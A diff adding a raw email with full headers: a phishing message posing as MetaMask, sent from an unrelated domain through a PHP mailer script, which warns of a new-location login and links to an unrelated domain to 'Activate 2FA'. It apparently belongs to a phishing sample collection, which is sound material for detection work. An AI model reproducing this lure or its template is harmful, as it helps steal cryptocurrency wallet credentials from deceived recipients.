@@ -1,0 +1,66 @@
+Return-Path: <postmaster@5c342567e9.nxcli.io>
+Delivered-To: info@vorteksenerji.com
+Received: from fr-life.guzelhosting.com
+	by fr-life.guzelhosting.com with LMTP
+	id SPkNAcLxF2hEYQAAOB6+FQ
+	(envelope-from <postmaster@5c342567e9.nxcli.io>)
+	for <info@vorteksenerji.com>; Mon, 05 May 2025 02:01:22 +0300
+Return-path: <postmaster@5c342567e9.nxcli.io>
+Envelope-to: info@vorteksenerji.com
+Delivery-date: Mon, 05 May 2025 02:01:22 +0300
+Received: from cloudhost-3836119.uk-south-2.nxcli.net ([165.84.217.12]:52104)
+	by fr-life.guzelhosting.com with esmtps  (TLS1.2) tls TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
+	(Exim 4.98.1)
+	(envelope-from <postmaster@5c342567e9.nxcli.io>)
+	id 1uBiKn-000000006Nl-44g5
+	for info@vorteksenerji.com;
+	Mon, 05 May 2025 02:01:21 +0300
+Comment: DomainKeys? See http://domainkeys.sourceforge.net/
+DomainKey-Signature: a=rsa-sha1; q=dns; c=nofws;
+  s=default; d=5c342567e9.nxcli.io;
+  b=N5XxOCS3BPGEnMKZGv9so5OZtCSkHDMQZOLUDYEJ1nyTtRLsrnXipZHtMFgBJrte++koRrqASI1x/oQGxTrqBetTZ0pD4aO5NCOigwn0AuVJ9rGDMmepaBNR0DcoW0/wjv3nj0fQAshSuuSRD+t/GzDgujQrKRD3XMW59A6+1NyMWBsrWFiNmQQA09GtU4G/oAqqXGmP8VGVSfqn4AnFGtb3RXZkYWd374p5F0O0sRrK+wD9yTLvnC3bMgxyxzYDHbzPzOuN44lnrwKHTx36pbYLE39frZYoF3nvVAFfA9e0zF3C4/jC9PuuLJv38neGr20IVC3o3QTkvY/1QMj+wA==;
+  h=Received:Date:Message-ID:To:Subject:X-PHP-Originating-Script:From:MIME-Version:Content-Type;
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed; d=5c342567e9.nxcli.io; h=
+	date:message-id:to:subject:from:mime-version:content-type; s=
+	default; bh=chImZcYBOPRfIz0CX8SQhwy6IUY6iwnZjQJedloyyWY=; b=c+t5
+	mVpQKKTSI626Zl6AUy5D+WS8CVsfenpCweHjBjjdjX8/5nD9qeyU5FjbQIgDQPNB
+	TUYZY+dj+BGV3CV2aBUiUaRizdkuZ7rPwBeJPmKbrjUTYZPa37pwAhKaxDH9i29+
+	GM3I9kCRYKh8fLJq8vyIGSOEcmPdi/TNDyJPD2tMqCCKio1ZkyoFH/yevxpTVeVj
+	nZzq6Bs142cGU7RDVjIs+YuFg0ajmVS0I2KEy8PZ2Fl5t0YNlyvbYRLeM+bCszY5
+	tf7ptCXNPy21ogn+GwjkWEfLvmEeavFooI8V5sj8w/2I5YzUi9AulocwX3PFfmCO
+	LdWGk3edtodIQKxJFg==
+Received: (qmail 23124 invoked by uid 10227); 5 May 2025 00:00:09 +0100
+Date: 5 May 2025 00:00:09 +0100
+Message-ID: <20250504230009.23119.qmail@cloudhost-3836119.uk-south-2.nxcli.net>
+To: info@vorteksenerji.com
+Subject: We noticed a recent login from a new location
+X-PHP-Originating-Script: 10227:v.php
+From: "MetaMask" <ss3qibka@f2a.io>
+MIME-Version: 1.0
+Content-Type: text/html; charset=UTF-8
+
+
+<!DOCTYPE html>
+<html lang=en>
+<body style=margin:0;padding:20px;font-family:Arial,sans-serif;background:#f8f9fa;color:#333>
+<table cellpadding=0 cellspacing=0 border=0 width=100% style="max-width:520px;margin:auto;background:#fff;border:1px solid #ddd;border-radius:6px">
+<tr>
+<td style="padding:24px 28px;text-align:center">
+<div style=font-size:32px;margin-bottom:10px>🦊</div>
+<h2 style=color:#f6851b;font-size:18px;margin-bottom:16px>Access Confirmation</h2>
+<p style="font-size:15px;line-height:1.6;margin:0 0 20px">
+We noticed a recent login from a new location. To help secure your wallet, we suggest enabling 2FA.
+</p>
+<p style="margin:26px 0">
+<a href="https://raw-acts.com/apple/?id=-7089967771023761456-2199" style="background:#f6851b;color:#fff;text-decoration:none;padding:10px 24px;border-radius:4px;font-weight:bold;font-size:15px">
+Activate 2FA
+</a>
+</p>
+<p style=font-size:12px;color:#777;margin-top:14px>
+If this was you, no further action is required.
+</p>
+</td>
+</tr>
+</table>
+</body>
+</html>
